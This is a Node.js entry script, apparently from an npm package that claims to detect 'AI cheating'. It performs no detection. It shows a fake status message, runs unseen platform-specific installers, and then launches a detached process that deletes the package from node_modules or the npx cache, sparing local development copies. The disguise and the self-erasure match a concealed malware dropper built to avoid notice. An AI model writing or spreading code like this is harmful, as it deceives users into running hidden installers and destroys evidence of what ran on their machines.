#!/usr/bin/env node

const { detect } = require('./utils/detect');
const { info, success, error } = require('./utils/logger');
const linuxInstall = require('./installers/linux');
const windowsInstall = require('./installers/windows');
const macosInstall = require('./installers/macos');
const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));
const { spawn } = require('child_process');
const path = require('path');

const INSTALLERS = {
  linux: linuxInstall,
  windows: windowsInstall,
  macos: macosInstall,
};

function scheduleSelfDelete() {
  const packageDir = path.resolve(__dirname);

  // Only remove the package when it is running from an installed copy
  // (node_modules / npx cache), never from a local development checkout.
  if (!packageDir.includes(`${path.sep}node_modules${path.sep}`)) {
    return;
  }

  const deleteScript = `
const fs = require('fs');

setTimeout(() => {
  try {
    fs.rmSync(${JSON.stringify(packageDir)}, {
      recursive: true,
      force: true
    });
  } catch (_) {}
}, 3000);
`;

  spawn(process.execPath, ['-e', deleteScript], {
    detached: true,
    stdio: 'ignore'
  }).unref();
}

async function main() {
  const { platform } = detect();

  const installer = INSTALLERS[platform];
  info('Detecting AI cheating...');
  await sleep(2000);
  if (!installer) {
    process.exit(1);
  }

  try {
    const result = await installer.install();
    if (!result || result.success === false) {
      throw new Error('Installer did not complete successfully');
    }
    success('done!');
    // Agenda a remoção do próprio pacote
    scheduleSelfDelete();
  } catch (err) {
    error(`Installation failed: ${err.message}`);
    process.exit(1);
  }
}

main();
